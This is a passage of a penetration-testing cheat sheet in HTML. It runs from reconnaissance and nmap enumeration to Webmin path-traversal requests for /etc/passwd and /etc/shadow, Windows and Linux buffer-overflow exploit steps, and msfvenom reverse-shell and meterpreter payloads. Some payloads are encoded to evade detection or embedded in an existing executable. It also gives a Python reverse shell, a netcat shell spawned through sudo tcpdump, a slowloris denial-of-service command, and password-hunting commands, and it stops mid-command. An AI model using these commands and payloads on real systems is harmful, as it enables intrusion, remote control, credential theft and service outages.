Vulnerability Scanning"></a>Information Gathering &amp; Vulnerability Scanning</h1><ul><li><h2 id="Passive-Information-Gathering"><a href="#Passive-Information-Gathering" class="headerlink" title="Passive Information Gathering"></a>Passive Information Gathering</h2></li><li><p>Google Hacking</p><ul><li><p>Google search to find website sub domains<br><code>site:microsoft.com</code></p></li><li><p>Google filetype, and intitle<br><code>intitle:&quot;netbotz appliance&quot; &quot;OK&quot; -filetype:pdf</code></p></li><li><p>Google inurl<br><code>inurl:&quot;level/15/sexec/-/show&quot;</code></p></li><li><p>Google Hacking Database:<br><a href="https://www.exploit-db.com/google-hacking-database/">https://www.exploit-db.com/google-hacking-database/</a></p></li></ul></li><li><p>SSL Certificate Testing<br><a href="https://www.ssllabs.com/ssltest/analyze.html">https://www.ssllabs.com/ssltest/analyze.html</a></p></li><li><p>Email Harvesting</p><ul><li><p>Simply Email<br><code>git clone https://github.com/killswitch-GUI/SimplyEmail.git  </code></p><p><code>./SimplyEmail.py -all -e TARGET-DOMAIN</code></p></li></ul></li><li><p>Netcraft</p><ul><li>Determine the operating system and tools used to build a site<br><a href="https://searchdns.netcraft.com/">https://searchdns.netcraft.com/</a></li></ul></li><li><p>Whois Enumeration<br><code>whois domain-name-here.com  </code></p><p><code>whois $ip</code></p></li><li><p>Banner Grabbing</p><ul><li><p><code>nc -v $ip 25</code></p></li><li><p><code>telnet $ip 25</code></p></li><li><p><code>nc TARGET-IP 80</code></p></li></ul></li><li><p>Recon-ng - full-featured web reconnaissance framework written in Python</p><ul><li><p><code>cd /opt; git clone https://LaNMaSteR53@bitbucket.org/LaNMaSteR53/recon-ng.git  </code></p><p><code>cd /opt/recon-ng  </code></p><p><code>./recon-ng  </code></p><p><code>show modules  </code></p><p><code>help</code></p></li></ul></li><li><h2 id="Active-Information-Gathering"><a href="#Active-Information-Gathering" class="headerlink" title="Active Information Gathering"></a>Active Information Gathering</h2></li></ul><!-- --><ul><li><h2 id="Port-Scanning"><a href="#Port-Scanning" class="headerlink" title="Port Scanning"></a>Port Scanning</h2></li></ul><p><em>Subnet Reference Table</em></p><table><thead><tr><th>&#x2F;</th><th>Addresses</th><th>Hosts</th><th>Netmask</th><th>Amount of a Class C</th></tr></thead><tbody><tr><td>&#x2F;30</td><td>4</td><td>2</td><td>255.255.255.252</td><td>1&#x2F;64</td></tr><tr><td>&#x2F;29</td><td>8</td><td>6</td><td>255.255.255.248</td><td>1&#x2F;32</td></tr><tr><td>&#x2F;28</td><td>16</td><td>14</td><td>255.255.255.240</td><td>1&#x2F;16</td></tr><tr><td>&#x2F;27</td><td>32</td><td>30</td><td>255.255.255.224</td><td>1&#x2F;8</td></tr><tr><td>&#x2F;26</td><td>64</td><td>62</td><td>255.255.255.192</td><td>1&#x2F;4</td></tr><tr><td>&#x2F;25</td><td>128</td><td>126</td><td>255.255.255.128</td><td>1&#x2F;2</td></tr><tr><td>&#x2F;24</td><td>256</td><td>254</td><td>255.255.255.0</td><td>1</td></tr><tr><td>&#x2F;23</td><td>512</td><td>510</td><td>255.255.254.0</td><td>2</td></tr><tr><td>&#x2F;22</td><td>1024</td><td>1022</td><td>255.255.252.0</td><td>4</td></tr><tr><td>&#x2F;21</td><td>2048</td><td>2046</td><td>255.255.248.0</td><td>8</td></tr><tr><td>&#x2F;20</td><td>4096</td><td>4094</td><td>255.255.240.0</td><td>16</td></tr><tr><td>&#x2F;19</td><td>8192</td><td>8190</td><td>255.255.224.0</td><td>32</td></tr><tr><td>&#x2F;18</td><td>16384</td><td>16382</td><td>255.255.192.0</td><td>64</td></tr><tr><td>&#x2F;17</td><td>32768</td><td>32766</td><td>255.255.128.0</td><td>128</td></tr><tr><td>&#x2F;16</td><td>65536</td><td>65534</td><td>255.255.0.0</td><td>256</td></tr></tbody></table><ul><li><p>Set the ip address as a varble<br><code>export ip=192.168.1.100  </code><br><code>nmap -A -T4 -p- $ip</code></p></li><li><p>Netcat port Scanning<br><code>nc -nvv -w 1 -z $ip 3388-3390</code></p></li><li><p>Discover active IPs usign ARP on the network:<br><code>arp-scan $ip/24</code></p></li><li><p>Discover who else is on the network<br><code>netdiscover</code></p></li><li><p>Discover IP Mac and Mac vendors from ARP<br><code>netdiscover -r $ip/24</code></p></li><li><p>Nmap stealth scan using SYN<br><code>nmap -sS $ip</code></p></li><li><p>Nmap stealth scan using FIN<br><code>nmap -sF $ip</code></p></li><li><p>Nmap Banner Grabbing<br><code>nmap -sV -sT $ip</code></p></li><li><p>Nmap OS Fingerprinting<br><code>nmap -O $ip</code></p></li><li><p>Nmap Regular Scan:<br><code>nmap $ip/24</code></p></li><li><p>Enumeration Scan<br><code>nmap -p 1-65535 -sV -sS -A -T4 $ip/24 -oN nmap.txt</code></p></li><li><p>Enumeration Scan All Ports TCP &#x2F; UDP and output to a txt file<br><code>nmap -oN nmap2.txt -v -sU -sS -p- -A -T4 $ip</code></p></li><li><p>Nmap output to a file:<br><code>nmap -oN nmap.txt -p 1-65535 -sV -sS -A -T4 $ip/24</code></p></li><li><p>Quick Scan:<br><code>nmap -T4 -F $ip/24</code></p></li><li><p>Quick Scan Plus:<br><code>nmap -sV -T4 -O -F --version-light $ip/24</code></p></li><li><p>Quick traceroute<br><code>nmap -sn --traceroute $ip</code></p></li><li><p>All TCP and UDP Ports<br><code>nmap -v -sU -sS -p- -A -T4 $ip</code></p></li><li><p>Intense Scan:<br><code>nmap -T4 -A -v $ip</code></p></li><li><p>Intense Scan Plus UDP<br><code>nmap -sS -sU -T4 -A -v $ip/24</code></p></li><li><p>Intense Scan ALL TCP Ports<br><code>nmap -p 1-65535 -T4 -A -v $ip/24</code></p></li><li><p>Intense Scan - No Ping<br><code>nmap -T4 -A -v -Pn $ip/24</code></p></li><li><p>Ping scan<br><code>nmap -sn $ip/24</code></p></li><li><p>Slow Comprehensive Scan<br><code>nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script &quot;default or (discovery and safe)&quot; $ip/24</code></p></li><li><p>Scan with Active connect in order to weed out any spoofed ports designed to troll you<br><code>nmap -p1-65535 -A -T5 -sT $ip</code></p></li><li><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2></li><li><p>DNS Enumeration</p><ul><li><p>NMAP DNS Hostnames Lookup<br><code>nmap -F --dns-server &lt;dns server ip&gt; &lt;target ip range&gt;</code></p></li><li><p>Host Lookup<br><code>host -t ns megacorpone.com</code></p></li><li><p>Reverse Lookup Brute Force - find domains in the same range<br><code>for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v &quot;not found&quot;</code></p></li><li><p>Perform DNS IP Lookup<br><code>dig a domain-name-here.com @nameserver</code></p></li><li><p>Perform MX Record Lookup<br><code>dig mx domain-name-here.com @nameserver</code></p></li><li><p>Perform Zone Transfer with DIG<br><code>dig axfr domain-name-here.com @nameserver</code></p></li><li><p>DNS Zone Transfers<br>Windows DNS zone transfer</p><p><code>nslookup -&gt; set type=any -&gt; ls -d blah.com  </code></p><p>Linux DNS zone transfer</p><p><code>dig axfr blah.com @ns1.blah.com</code></p></li><li><p>Dnsrecon DNS Brute Force<br><code>dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml</code></p></li><li><p>Dnsrecon DNS List of megacorp<br><code>dnsrecon -d megacorpone.com -t axfr</code></p></li><li><p>DNSEnum<br><code>dnsenum zonetransfer.me</code></p></li></ul></li><li><p>NMap Enumeration Script List:</p><ul><li><p>NMap Discovery<br><a href="https://nmap.org/nsedoc/categories/discovery.html"><em>https://nmap.org/nsedoc/categories/discovery.html</em></a></p></li><li><p>Nmap port version detection MAXIMUM power<br><code>nmap -vvv -A --reason --script=&quot;+(safe or default) and not broadcast&quot; -p &lt;port&gt; &lt;host&gt;</code></p></li></ul></li><li><p>NFS (Network File System) Enumeration</p><ul><li>Show Mountable NFS Shares<br><code>nmap -sV --script=nfs-showmount $ip</code></li></ul></li><li><p>RPC (Remote Procedure Call) Enumeration</p><ul><li><p>Connect to an RPC share without a username and password and enumerate privledges<br><code>rpcclient --user=&quot;&quot; --command=enumprivs -N $ip</code></p></li><li><p>Connect to an RPC share with a username and enumerate privledges<br><code>rpcclient --user=&quot;&lt;Username&gt;&quot; --command=enumprivs $ip</code></p></li></ul></li><li><p>SMB Enumeration</p><ul><li><p>SMB OS Discovery<br><code>nmap $ip --script smb-os-discovery.nse</code></p></li><li><p>Nmap port scan<br><code>nmap -v -p 139,445 -oG smb.txt $ip-254</code></p></li><li><p>Netbios Information Scanning<br><code>nbtscan -r $ip/24</code></p></li><li><p>Nmap find exposed Netbios servers<br><code>nmap -sU --script nbstat.nse -p 137 $ip</code></p></li><li><p>Nmap all SMB scripts scan</p><p><code>nmap -sV -Pn -vv -p 445 --script=&#39;(smb*) and not (brute or broadcast or dos or external or fuzzer)&#39; --script-args=unsafe=1 $ip</code></p></li><li><p>Nmap all SMB scripts authenticated scan</p><p><code>nmap -sV -Pn -vv -p 445  --script-args smbuser=&lt;username&gt;,smbpass=&lt;password&gt; --script=&#39;(smb*) and not (brute or broadcast or dos or external or fuzzer)&#39; --script-args=unsafe=1 $ip</code></p></li><li><p>SMB Enumeration Tools<br><code>nmblookup -A $ip  </code></p><p><code>smbclient //MOUNT/share -I $ip -N  </code></p><p><code>rpcclient -U &quot;&quot; $ip  </code></p><p><code>enum4linux $ip  </code></p><p><code>enum4linux -a $ip</code></p></li><li><p>SMB Finger Printing<br><code>smbclient -L //$ip</code></p></li><li><p>Nmap Scan for Open SMB Shares<br><code>nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24</code></p></li><li><p>Nmap scans for vulnerable SMB Servers<br><code>nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip</code></p></li><li><p>Nmap List all SMB scripts installed<br><code>ls -l /usr/share/nmap/scripts/smb*</code></p></li><li><p>Enumerate SMB Users</p><p><code>nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $ip-14</code></p><p> OR</p><p> <code>python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip</code></p></li><li><p>RID Cycling - Null Sessions<br><code>ridenum.py $ip 500 50000 dict.txt</code></p></li><li><p>Manual Null Session Testing</p><p>Windows: <code>net use \\$ip\IPC$ &quot;&quot; /u:&quot;&quot;</code></p><p>Linux: <code>smbclient -L //$ip</code></p></li></ul></li><li><p>SMTP Enumeration - Mail Severs</p><ul><li>Verify SMTP port using Netcat<br><code>nc -nv $ip 25</code></li></ul></li><li><p>POP3 Enumeration - Reading other peoples mail - You may find usernames and passwords for email accounts, so here is how to check the mail using Telnet</p><pre><code> root@kali:~# telnet $ip 110 +OK beta POP3 server (JAMES POP3 Server 2.3.2) ready USER billydean +OK PASS password +OK Welcome billydean list +OK 2 1807 1 786 2 1021 retr 1 +OK Message follows From: jamesbrown@motown.com Dear Billy Dean, Here is your login for remote desktop ... try not to forget it this time! username: billydean password: PA$$W0RD!Z</code></pre></li><li><p>SNMP Enumeration -Simple Network Management Protocol</p><ul><li><p>Fix SNMP output values so they are human readable<br><code>apt-get install snmp-mibs-downloader download-mibs  </code><br><code>echo &quot;&quot; &gt; /etc/snmp/snmp.conf</code></p></li><li><p>SNMP Enumeration Commands</p><ul><li><p><code>snmpcheck -t $ip -c public</code></p></li><li><p><code>snmpwalk -c public -v1 $ip 1|</code></p></li><li><p><code>grep hrSWRunName|cut -d\* \* -f</code></p></li><li><p><code>snmpenum -t $ip</code></p></li><li><p><code>onesixtyone -c names -i hosts</code></p></li></ul></li><li><p>SNMPv3 Enumeration<br><code>nmap -sV -p 161 --script=snmp-info $ip/24</code></p></li><li><p>Automate the username enumeration process for SNMPv3:<br><code>apt-get install snmp snmp-mibs-downloader  </code><br><code>wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb</code></p></li><li><p>SNMP Default Credentials<br>&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;wordlists&#x2F;snmp_default_pass.txt</p></li></ul></li><li><p>MS SQL Server Enumeration</p><ul><li><p>Nmap Information Gathering</p><p><code>nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes  --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER $ip</code></p></li></ul></li><li><p>Webmin and miniserv&#x2F;0.01 Enumeration - Port 10000</p><p>  Test for LFI &amp; file disclosure vulnerability by grabbing &#x2F;etc&#x2F;passwd</p><pre><code>`curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd`</code></pre><p>  Test to see if webmin is running as root by grabbing &#x2F;etc&#x2F;shadow</p><pre><code>`curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow`</code></pre></li><li><p>Linux OS Enumeration</p><ul><li><p>List all SUID files<br><code>find / -perm -4000 2&gt;/dev/null</code></p></li><li><p>Determine the current version of Linux<br><code>cat /etc/issue</code></p></li><li><p>Determine more information about the environment<br><code>uname -a</code></p></li><li><p>List processes running<br><code>ps -xaf</code></p></li><li><p>List the allowed (and forbidden) commands for the invoking use<br><code>sudo -l</code></p></li><li><p>List iptables rules<br><code>iptables --table nat --list iptables -vL -t filter iptables -vL -t nat iptables -vL -t mangle iptables -vL -t raw iptables -vL -t security</code></p></li></ul></li><li><p>Windows OS Enumeration</p><ul><li><p>net config Workstation</p></li><li><p>systeminfo | findstr &#x2F;B &#x2F;C:”OS Name” &#x2F;C:”OS Version”</p></li><li><p>hostname</p></li><li><p>net users</p></li><li><p>ipconfig &#x2F;all</p></li><li><p>route print</p></li><li><p>arp -A</p></li><li><p>netstat -ano</p></li><li><p>netsh firewall show state</p></li><li><p>netsh firewall show config</p></li><li><p>schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</p></li><li><p>tasklist &#x2F;SVC</p></li><li><p>net start</p></li><li><p>DRIVERQUERY</p></li><li><p>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</p></li><li><p>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</p></li><li><p>dir &#x2F;s <em>pass</em> &#x3D;&#x3D; <em>cred</em> &#x3D;&#x3D; <em>vnc</em> &#x3D;&#x3D; <em>.config</em></p></li><li><p>findstr &#x2F;si password *.xml *.ini *.txt</p></li><li><p>reg query HKLM &#x2F;f password &#x2F;t REG_SZ &#x2F;s</p></li><li><p>reg query HKCU &#x2F;f password &#x2F;t REG_SZ &#x2F;s</p></li></ul></li><li><p>Vulnerability Scanning with Nmap</p></li><li><p>Nmap Exploit Scripts<br><a href="https://nmap.org/nsedoc/categories/exploit.html"><em>https://nmap.org/nsedoc/categories/exploit.html</em></a></p></li><li><p>Nmap search through vulnerability scripts<br><code>cd /usr/share/nmap/scripts/ ls -l \*vuln\*</code></p></li><li><p>Nmap search through Nmap Scripts for a specific keyword<br><code>ls /usr/share/nmap/scripts/\* | grep ftp</code></p></li><li><p>Scan for vulnerable exploits with nmap<br><code>nmap --script exploit -Pn $ip</code></p></li><li><p>NMap Auth Scripts<br><a href="https://nmap.org/nsedoc/categories/auth.html"><em>https://nmap.org/nsedoc/categories/auth.html</em></a></p></li><li><p>Nmap Vuln Scanning<br><a href="https://nmap.org/nsedoc/categories/vuln.html"><em>https://nmap.org/nsedoc/categories/vuln.html</em></a></p></li><li><p>NMap DOS Scanning<br><code>nmap --script dos -Pn $ip NMap Execute DOS Attack nmap --max-parallelism 750 -Pn --script http-slowloris --script-args http-slowloris.runforever=true</code></p></li><li><p>Scan for coldfusion web vulnerabilities<br><code>nmap -v -p 80 --script=http-vuln-cve2010-2861 $ip</code></p></li><li><p>Anonymous FTP dump with Nmap<br><code>nmap -v -p 21 --script=ftp-anon.nse $ip-254</code></p></li><li><p>SMB Security mode scan with Nmap<br><code>nmap -v -p 21 --script=ftp-anon.nse $ip-254</code></p></li><li><p>File Enumeration</p><ul><li><p>Find UID 0 files root execution</p></li><li><p><code>/usr/bin/find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld &#123;&#125; \\; 2&gt;/dev/null</code></p></li><li><p>Get handy linux file system enumeration script (&#x2F;var&#x2F;tmp)<br><code>wget https://highon.coffee/downloads/linux-local-enum.sh  </code><br><code>chmod +x ./linux-local-enum.sh  </code><br><code>./linux-local-enum.sh</code></p></li><li><p>Find executable files updated in August<br><code>find / -executable -type f 2&gt; /dev/null | egrep -v &quot;^/bin|^/var|^/etc|^/usr&quot; | xargs ls -lh | grep Aug</code></p></li><li><p>Find a specific file on linux<br><code>find /. -name suid\*</code></p></li><li><p>Find all the strings in a file<br><code>strings &lt;filename&gt;</code></p></li><li><p>Determine the type of a file<br><code>file &lt;filename&gt;</code></p></li></ul></li><li><h2 id="HTTP-Enumeration"><a href="#HTTP-Enumeration" class="headerlink" title="HTTP Enumeration"></a>HTTP Enumeration</h2><ul><li><p>Search for folders with gobuster:<br><code>gobuster -w /usr/share/wordlists/dirb/common.txt -u $ip</code></p></li><li><p>OWasp DirBuster - Http folder enumeration - can take a dictionary file</p></li><li><p>Dirb - Directory brute force finding using a dictionary file<br><code>dirb http://$ip/ wordlist.dict  </code><br><code>dirb &lt;http://vm/&gt;  </code></p><p>Dirb against a proxy</p></li><li><p><code>dirb [http://$ip/](http://172.16.0.19/) -p $ip:3129</code></p></li><li><p>Nikto<br><code>nikto -h $ip</code></p></li><li><p>HTTP Enumeration with NMAP<br><code>nmap --script=http-enum -p80 -n $ip/24</code></p></li><li><p>Nmap Check the server methods<br><code>nmap --script http-methods --script-args http-methods.url-path=&#39;/test&#39; $ip</code></p></li><li><p>Get Options available from web server<br> <code>curl -vX OPTIONS vm/test</code></p></li><li><p>Uniscan directory finder:<br><code>uniscan -qweds -u &lt;http://vm/&gt;</code></p></li><li><p>Wfuzz - The web brute forcer</p><p><code>wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test  </code></p><p><code>wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ  </code></p><p><code>wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt &quot;$ip:60080/?page=mailer&amp;mail=FUZZ&quot;</code></p><p><code>wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ</code></p><p>Recurse level 3</p><p><code>wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ</code></p></li></ul></li></ul><!-- --><ul><li><p>Open a service using a port knock (Secured with Knockd)<br>for x in 7000 8000 9000; do nmap -Pn –host_timeout 201<br>–max-retries 0 -p $x server_ip_address; done</p></li><li><p>WordPress Scan - Wordpress security scanner</p><ul><li>wpscan –url $ip&#x2F;blog –proxy $ip:3129</li></ul></li><li><p>RSH Enumeration - Unencrypted file transfer system</p><ul><li>auxiliary&#x2F;scanner&#x2F;rservices&#x2F;rsh_login</li></ul></li><li><p>Finger Enumeration</p><ul><li><p>finger @$ip</p></li><li><p>finger batman@$ip</p></li></ul></li><li><p>TLS &amp; SSL Testing</p><ul><li>.&#x2F;testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha &gt;<br>OUTPUT-FILE.html</li></ul></li><li><p>Proxy Enumeration (useful for open proxies)</p><ul><li>nikto -useproxy http:&#x2F;&#x2F;$ip:3128 -h $ip</li></ul></li><li><p>Steganography</p></li></ul><blockquote><p>apt-get install steghide</p><p>steghide extract -sf picture.jpg</p><p>steghide info picture.jpg</p><p>apt-get install stegosuite</p></blockquote><ul><li><p>The OpenVAS Vulnerability Scanner</p><ul><li><p>apt-get update<br>apt-get install openvas<br>openvas-setup</p></li><li><p>netstat -tulpn</p></li><li><p>Login at:<br>https:&#x2F;&#x2F;$ip:9392</p></li></ul></li></ul><h1 id="Buffer-Overflows-and-Exploits"><a href="#Buffer-Overflows-and-Exploits" class="headerlink" title="Buffer Overflows and Exploits"></a>Buffer Overflows and Exploits</h1><ul><li><p>DEP and ASLR - Data Execution Prevention (DEP) and Address Space<br>Layout Randomization (ASLR)</p></li><li><p>Nmap Fuzzers:</p><ul><li><p>NMap Fuzzer List<br><a href="https://nmap.org/nsedoc/categories/fuzzer.html">https://nmap.org/nsedoc/categories/fuzzer.html</a></p></li><li><p>NMap HTTP Form Fuzzer<br>nmap –script http-form-fuzzer –script-args<br>‘http-form-fuzzer.targets&#x3D;{1&#x3D;{path&#x3D;&#x2F;},2&#x3D;{path&#x3D;&#x2F;register.html}}’<br>-p 80 $ip</p></li><li><p>Nmap DNS Fuzzer<br>nmap –script dns-fuzz –script-args timelimit&#x3D;2h $ip -d</p></li></ul></li><li><p>MSFvenom<br><a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/"><em>https://www.offensive-security.com/metasploit-unleashed/msfvenom/</em></a></p></li><li><p>Windows Buffer Overflows</p><ul><li><p>Controlling EIP</p><pre><code> locate pattern_create pattern_create.rb -l 2700 locate pattern_offset pattern_offset.rb -q 39694438</code></pre></li><li><p>Verify exact location of EIP - [*] Exact match at offset 2606</p><pre><code>buffer = &quot;A&quot; \* 2606 + &quot;B&quot; \* 4 + &quot;C&quot; \* 90</code></pre></li><li><p>Check for “Bad Characters” - Run multiple times 0x00 - 0xFF</p></li><li><p>Use Mona to determine a module that is unprotected</p></li><li><p>Bypass DEP if present by finding a Memory Location with Read and Execute access for JMP ESP</p></li><li><p>Use NASM to determine the HEX code for a JMP ESP instruction</p><pre><code>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rbJMP ESP00000000 FFE4 jmp esp</code></pre></li><li><p>Run Mona in immunity log window to find (FFE4) XEF command</p><pre><code>!mona find -s &quot;\xff\xe4&quot; -m slmfc.dllfound at 0x5f4a358f - Flip around for little endian formatbuffer = &quot;A&quot; * 2606 + &quot;\x8f\x35\x4a\x5f&quot; + &quot;C&quot; * 390</code></pre></li><li><p>MSFVenom to create payload</p><pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c –e x86/shikata_ga_nai -b &quot;\x00\x0a\x0d&quot;</code></pre></li><li><p>Final Payload with NOP slide</p><pre><code>buffer=&quot;A&quot;*2606 + &quot;\x8f\x35\x4a\x5f&quot; + &quot;\x90&quot; * 8 + shellcode</code></pre></li><li><p>Create a PE Reverse Shell<br>msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;$ip LPORT&#x3D;4444<br>-f<br>exe -o shell_reverse.exe</p></li><li><p>Create a PE Reverse Shell and Encode 9 times with<br>Shikata_ga_nai<br>msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;$ip LPORT&#x3D;4444<br>-f<br>exe -e x86&#x2F;shikata_ga_nai -i 9 -o<br>shell_reverse_msf_encoded.exe</p></li><li><p>Create a PE reverse shell and embed it into an existing<br>executable<br>msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;$ip LPORT&#x3D;4444 -f<br>exe -e x86&#x2F;shikata_ga_nai -i 9 -x<br>&#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;plink.exe -o<br>shell_reverse_msf_encoded_embedded.exe</p></li><li><p>Create a PE Reverse HTTPS shell<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_https LHOST&#x3D;$ip<br>LPORT&#x3D;443 -f exe -o met_https_reverse.exe</p></li></ul></li><li><p>Linux Buffer Overflows</p><ul><li><p>Run Evans Debugger against an app<br>edb –run &#x2F;usr&#x2F;games&#x2F;crossfire&#x2F;bin&#x2F;crossfire</p></li><li><p>ESP register points toward the end of our CBuffer<br>add eax,12<br>jmp eax<br>83C00C add eax,byte +0xc<br>FFE0 jmp eax</p></li><li><p>Check for “Bad Characters” Process of elimination - Run multiple<br>times 0x00 - 0xFF</p></li><li><p>Find JMP ESP address<br>“\x97\x45\x13\x08” # Found at Address 08134597</p></li><li><p>crash &#x3D; “\x41” * 4368 + “\x97\x45\x13\x08” +<br>“\x83\xc0\x0c\xff\xe0\x90\x90”</p></li><li><p>msfvenom -p linux&#x2F;x86&#x2F;shell_bind_tcp LPORT&#x3D;4444 -f c -b<br>“\x00\x0a\x0d\x20” –e x86&#x2F;shikata_ga_nai</p></li><li><p>Connect to the shell with netcat:<br>nc -v $ip 4444</p></li></ul></li></ul><h1 id="Shells"><a href="#Shells" class="headerlink" title="Shells"></a>Shells</h1><ul><li><p>Netcat Shell Listener</p><p><code>nc -nlvp 4444</code></p></li><li><p>Spawning a TTY Shell - Break out of Jail or limited shell<br> You should almost always upgrade your shell after taking control of an apache or www user.<br><br>(For example when you encounter an error message when trying to run an exploit sh: no job control in this shell )<br><br>(hint: sudo -l to see what you can run)</p><ul><li><p>You may encounter limited shells that use rbash and only allow you to execute a single command per session.<br>You can overcome this by executing an SSH shell to your localhost:</p><pre><code>  ssh user@$ip nc $localip 4444 -e /bin/sh  enter user&#39;s password  python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;  export TERM=linux</code></pre></li></ul><p>  <code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code></p><pre><code>       python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);          s.connect((&quot;$ip&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\[&quot;/bin/sh&quot;,&quot;-i&quot;\]);&#39;</code></pre><p>  <code>echo os.system(&#39;/bin/bash&#39;)</code></p><p>  <code>/bin/sh -i</code></p><p>  <code>perl —e &#39;exec &quot;/bin/sh&quot;;&#39;</code></p><p>  perl: <code>exec &quot;/bin/sh&quot;;</code></p><p>  ruby: <code>exec &quot;/bin/sh&quot;</code></p><p>  lua: <code>os.execute(&#39;/bin/sh&#39;)</code></p><p>  From within IRB: <code>exec &quot;/bin/sh&quot;</code></p><p>  From within vi: <code>:!bash</code><br> or</p><p>  <code>:set shell=/bin/bash:shell</code></p><p>  From within vim <code>&#39;:!bash&#39;:</code></p><p>  From within nmap: <code>!sh</code></p><p>  From within tcpdump</p><pre><code> echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ &gt; /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root</code></pre><p>  From busybox  <code>/bin/busybox telnetd -|/bin/sh -p9999</code></p></li><li><p>Pen test monkey PHP reverse shell<br><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">http://pentestmonkey.net/tools/web-shells/php-reverse-shel</a></p></li><li><p>php-findsock-shell - turns PHP port 80 into an interactive shell<br><a href="http://pentestmonkey.net/tools/web-shells/php-findsock-shell">http://pentestmonkey.net/tools/web-shells/php-findsock-shell</a></p></li><li><p>Perl Reverse Shell<br><a href="http://pentestmonkey.net/tools/web-shells/perl-reverse-shell">http://pentestmonkey.net/tools/web-shells/perl-reverse-shell</a></p></li><li><p>PHP powered web browser Shell b374k with file upload etc.<br><a href="https://github.com/b374k/b374k">https://github.com/b374k/b374k</a></p></li><li><p>Windows reverse shell - PowerSploit’s Invoke-Shellcode script and inject a Meterpreter shell<br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1</a></p></li><li><p>Web Backdoors from Fuzzdb<br><a href="https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors">https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors</a></p></li><li><p>Creating Meterpreter Shells with MSFVenom - <a href="http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/">http://www.securityunlocked.com/2016/01/02/network-security-pentesting/most-useful-msfvenom-payloads/</a></p><p>  <em>Linux</em></p><p>  <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></p><p>  <em>Windows</em></p><p>  <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></p><p>  <em>Mac</em></p><p>  <code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></p><p>  <strong>Web Payloads</strong></p><p>  <em>PHP</em></p><p>  <code>msfvenom -p php/reverse_php LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</code></p><p>  OR</p><p>  <code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</code></p><p>  Then we need to add the &lt;?php at the first line of the file so that it will execute as a PHP webpage:</p><p>  <code>cat shell.php | 